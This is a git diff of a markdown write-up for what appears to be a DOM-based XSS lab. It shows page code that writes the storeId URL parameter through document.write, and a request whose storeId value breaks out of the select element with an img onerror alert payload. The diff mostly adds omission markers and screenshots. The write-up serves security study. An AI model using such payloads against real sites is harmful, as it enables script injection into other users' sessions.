@@ -25,7 +25,8 @@ Vulnerable JS code found .
 
 #### 📤 Response
 ```http
-<script>
+                    [...Remaining are omitted...]
+                            <script>
                                 var stores = ["London","Paris","Milan"];
                                 var store = (new URLSearchParams(window.location.search)).get('storeId');
                                 document.write('<select name="storeId">');
@@ -41,6 +42,7 @@ Vulnerable JS code found .
                                 document.write('</select>');
                             </script>
                             <select name="storeId"><option>London</option><option>Paris</option><option>Milan</option></select>
+                    [...Remaining are omitted...]
 ```
 
 I inserted a random alphanumeric string in `storeId` variable to see how it stores value.
@@ -72,3 +74,10 @@ GET /product?productId=1&storeId=</select><img src=1 onerror=alert(document.doma
 ```
 
 #### 📤 Response
+
+<img width="925" height="837" alt="payload-response-pic" src="https://github.com/user-attachments/assets/4edce404-50de-46f8-b8d1-8e33a5c4fb8b" />
+
+After executing the payload, the page looks like this:
+
+<img width="1920" height="840" alt="page-output" src="https://github.com/user-attachments/assets/b5411a35-eed8-4881-b13e-d0ae9c3b5038" />
+
